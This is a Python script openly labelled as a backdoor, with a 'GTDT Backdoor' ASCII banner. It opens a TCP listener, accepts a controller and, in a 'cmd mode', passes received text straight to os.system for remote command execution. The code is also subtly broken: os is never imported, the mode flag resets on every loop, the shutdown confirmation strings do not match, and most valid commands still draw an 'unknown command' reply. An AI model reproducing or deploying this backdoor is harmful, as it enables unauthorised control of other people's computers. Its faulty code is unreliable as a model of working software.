"""
   _____________________________________________________________________________________________
  |												|
  |	_____/\\\\\\\\\\\\__/\\\\\\\\\\\\\\\__/\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\_ 		|
  |	 ___/\\\//////////__\///////\\\/////__\/\\\////////\\\__\///////\\\/////__ 		|
  |	  __/\\\___________________\/\\\_______\/\\\______\//\\\_______\/\\\_______ 		|
  |	   _\/\\\____/\\\\\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______ 		|
  |	    _\/\\\___\/////\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______ 		|
  |	     _\/\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_______ 		|
  |	      _\/\\\_______\/\\\_______\/\\\_______\/\\\_______/\\\________\/\\\_______ 	|
  |	       _\//\\\\\\\\\\\\/________\/\\\_______\/\\\\\\\\\\\\/_________\/\\\_______ 	|
  |	        __\////////////__________\///________\////////////___________\///________ 	|
  |												|
  |												|
  |			.----.   .--.   .---. .-. .-..----.  .----.  .----. .----.		|
  |			| {}  } / {} \ /  ___}| |/ / | {}  \/  {}  \/  {}  \| {}  }		|
  |			| {}  }/  /\  \\     }| |\ \ |     /\      /\      /| .-. \		|
  |			`----' `-'  `-' `---' `-' `-'`----'  `----'  `----' `-' `-'		|
  |_____________________________________________________________________________________________|

"""



## Importing mudules.
import socket

## Help command text.
HelpCommand = """\n\n
	*Avaiable commands:
	Help / help
	EXIT
	Disconnect
	CmdOn
	CmdOff
"""

## Definition/Function that starts the server.
def ServerStart():
	global server, controller

	Host, Port = 'localhost', 6482

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((Host, Port))

## Definition/Function that starts the listening process and accepts connections.
def ListenAndAcceptConnection():
	global controller
	server.listen()
	controller, address = server.accept()
	controller.send("\n\n			Server:	You just connected to the server ".encode('utf-8'))

## Definition/Function with all the Functionality of the backdoor.
def Functionality():

	while True:

		## Server Command Reciver.
		SCR = controller.recv(2048).decode('utf-8')

		## Cmd Mode is disabled by default.
		CmdMode = False

		## Help Command.
		if SCR == "HELP" or SCR == "Help" or SCR == "help":
			controller.send(HelpCommand.encode('utf-8'))
			continue

		## Command to turn cmd mode on.
		if SCR == "CmdOn" or SCR == "CMDON" or SCR == "cmdon" or SCR == "Cmdon" or SCR == "cmdOn":
			CmdMode = True
			controller.send("\n\n			Server:	!! Cmd Mode Is On !!".encode('utf-8'))
			continue

		## Command to turn cmd mode off.
		if SCR == "CmdOff" or SCR == "CMDOFF" or SCR == "cmdoff" or SCR == "Cmdoff" or SCR == "cmdOff":
			CmdMode = False
			controller.send("\n\n			Server:	!! Cmd Mode Is Off !!".encode('utf-8'))

		## Command to disconnect the user.
		if SCR == "DISCONNECT" or SCR == "Disconnect" or SCR == "disconnect":
			controller.send("\n\n			Server:	You just disconnected".encode('utf-8'))
			controller.close()
			ReStart()

		## For CMD execution for windows.
		if CmdMode:
			CMD = os.system(SCR)

		## Exit command.
		if SCR == "SERVERSHUTDOWN" or SCR == "ServerShutdown" or SCR == "Servershutdown" or SCR == "servershutdown" or SCR == "serverShutdown":
			controller.send("\n\n			Server:	Confirm By Typing: 'Exit_Confirm_True'".encode('utf-8'))
			continue

		## Exit confirmation that shuts down the server & user script.
		if SCR == "Shutdown_The_Server_Confirm_True":
			controller.send("".encode('utf-8'))
			controller.send("\n\n			Server:	You closed server script".encode('utf-8'))
			exit()

		## If command is not detected send user that command is unknown.
		else:
			controller.send("\n\n			Server:	!!Unknown build in command!!".encode('utf-8'))

## Definition/Function for starting the server.
def Start():
	ServerStart()
	ListenAndAcceptConnection()

## Definition/Function for restarting the server.
def ReStart():
	ListenAndAcceptConnection()
	Functionality()

## Executing Start Definition/Function to the server.
Start()






